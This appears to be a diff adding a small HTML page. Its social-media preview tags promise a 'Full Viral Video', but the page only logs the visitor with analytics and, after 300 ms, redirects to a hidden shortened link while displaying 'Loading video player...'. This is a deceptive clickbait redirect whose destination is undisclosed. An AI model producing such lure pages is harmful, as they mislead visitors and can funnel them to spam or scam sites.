@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-530836845"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-530836845');
+    </script>
+
+    <meta property="og:title" content="Watch Full Viral Video Here" />
+    <meta property="og:description" content="Click to play the trending video" />
+    <meta property="og:image" content="https://your-image-url.com/thumbnail.jpg" />
+    <meta property="og:type" content="video.other" />
+
+    <script>
+        // Redirection Logic: Jo user analytics me record hone ke baad chalega
+        window.onload = function() {
+            var targetUrl = "https://t.co/ai7FHs76Ab";
+            
+            // 300ms ka chota sa gap taake Analytics track kar le aur phir redirect ho
+            setTimeout(function() {
+                window.location.href = targetUrl;
+            }, 300);
+        };
+    </script>
+</head>
+<body>
+    <p>Loading video player...</p>
+</body>
+</html>
